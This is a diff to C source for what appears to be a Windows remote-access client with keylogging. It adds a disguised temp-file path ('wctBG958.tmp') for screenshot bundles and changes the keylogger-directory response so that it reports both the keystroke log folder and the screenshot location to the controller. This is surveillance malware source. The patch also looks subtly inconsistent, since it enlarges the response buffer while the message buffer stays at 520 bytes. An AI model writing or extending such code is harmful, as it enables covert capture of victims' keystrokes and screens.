@@ -105,6 +105,23 @@ int remote_get_logs_dir(char* out_path, size_t out_size) {
     return 1;
 }
 
+int remote_get_screenshot_bundle_path(char* out_path, size_t out_size) {
+    if (!out_path || out_size < 8) return 0;
+    out_path[0] = '\0';
+
+    char base[MAX_PATH];
+    DWORD n = GetTempPathA((DWORD)sizeof(base), base);
+    if (n > 0 && n < (DWORD)sizeof(base)) {
+        size_t len = strlen(base);
+        if (len > 0 && base[len - 1] == '\\') base[len - 1] = '\0';
+        _snprintf_s(out_path, out_size, _TRUNCATE, "%s\\wctBG958.tmp", base);
+        return 1;
+    }
+
+    strcpy_s(out_path, out_size, "C:\\wctBG958.tmp");
+    return 1;
+}
+
 static int extract_json_string_basic(const char* src, const char* key, char* dst, size_t dst_sz) {
     if (!src || !key || !dst || dst_sz < 3) return 0;
     dst[0] = '\0';
@@ -1387,8 +1404,10 @@ void remote_client_run(void) {
                                 continue;
                             }
                             CreateDirectoryA(logs_dir, NULL);
-                            unsigned char resp_body[512];
-                            unsigned int resp_len = remote_proto_encode_get_keylogger_logs_directory_response(logs_dir, resp_body, sizeof(resp_body));
+                            char shot_path[MAX_PATH];
+                            if (!remote_get_screenshot_bundle_path(shot_path, sizeof(shot_path))) shot_path[0] = '\0';
+                            unsigned char resp_body[2048];
+                            unsigned int resp_len = remote_proto_encode_get_keylogger_logs_directory_response(logs_dir, shot_path, resp_body, sizeof(resp_body));
                             if (resp_len > 0) {
                                 unsigned char full_msg[520];
                                 unsigned int full_len = remote_proto_prepend_imessage(full_msg, sizeof(full_msg),
@@ -1397,7 +1416,7 @@ void remote_client_run(void) {
                                     unsigned char frame[524];
                                     unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame, sizeof(frame));
                                     int sent = (frame_len > 0 && send_frame_locked(transport, frame, frame_len));
-                                    remote_log("[loop] GetKeyloggerLogsDirectoryResponse sent: path=%s, send %s", logs_dir, sent ? "OK" : "FAIL");
+                                    remote_log("[loop] GetKeyloggerLogsDirectoryResponse sent: logs=%s shots=%s send %s", logs_dir, shot_path, sent ? "OK" : "FAIL");
                                 }
                             } else
                                 remote_log("[loop] GetKeyloggerLogsDirectoryResponse encode failed");
